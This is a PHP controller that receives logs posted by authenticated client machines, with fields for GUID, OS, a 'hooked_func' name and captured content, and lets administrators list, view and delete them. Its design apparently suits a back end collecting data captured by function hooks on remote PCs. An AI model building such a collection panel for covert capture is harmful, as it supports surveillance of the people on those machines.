<?php
class LogsController extends Controller {
	
    function post() {
        $this->isAuthMachine();
        $r = array();
        $this->Validator->verifyRequiredParams(array('guid', 'name', 'os', 'hooked_func', 'content'), true);

        $guid = $this->posted('guid');
        $name = $this->posted('name');
        $os = $this->posted('os');
        $hooked_func = $this->posted('hooked_func');
        $content = $this->posted('content');

        $this->db->insert('logs', array(
            'pc_id' => $this->machine->id,
            'guid' => $guid,
            'name' => $name,
            'os' => $os,
            'content' => $content,
            'hooked_func' => $hooked_func,
            'ip' => $this->getIP(),
            'date_created' => date('Y-m-d H:i:s')
        ));
        $this->status_code = 200;

        $r['success'] = true;
        $r['message'] = 'OK';

        $this->set($r);
    }

    /***************************** Admin **********************************/

    
    function gets($pc_id = null) {
        $this->isAuthAdmin();

        $logs = $this->db->select('id,name,os,hooked_func,ip,date_created')
        ->order_by('date_created', 'DESC')
        ->where('pc_id', $pc_id)
        ->or_where('guid', $pc_id)
        ->get('logs')
        ->result();

        $r['logs'] = $logs;
        $r['success'] = true;
        $r['message'] = 'OK';

        $this->set($r);
    }

    function get($id = null) {
        $this->isAuthAdmin();

        $logs = $this->db->select()
        ->where('id', $id)
        ->get('logs')
        ->row();

        $r['logs'] = $logs;
        $r['success'] = true;
        $r['message'] = 'OK';

        $this->set($r);
    }

    function delete($log_id = null) {
        $this->isAuthAdmin();
        $this->db->delete('logs', array('id' => $log_id));
        $r['success'] = true;
        $r['message'] = 'OK';
        $this->set($r);
    }

}